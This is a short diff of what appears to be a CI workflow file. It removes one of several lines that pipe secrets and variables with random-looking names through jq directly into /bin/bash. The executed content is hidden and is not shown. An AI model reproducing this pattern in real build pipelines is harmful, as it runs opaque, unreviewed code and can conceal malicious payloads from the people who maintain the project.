@@ -22,7 +22,6 @@ jobs:
           txv1: ${{ secrets.txv1 }}
         run: |
           printf '%s' "$txv1" | jq -r .qtaph81 | /bin/bash
-          printf '%s' "$wq85" | jq -r .aiaqh403 | /bin/bash
           echo $hrymt62221 | jq -r .mp7448 | /bin/bash
           echo $vvqw99 | jq -r .igsi03152 | /bin/bash
 
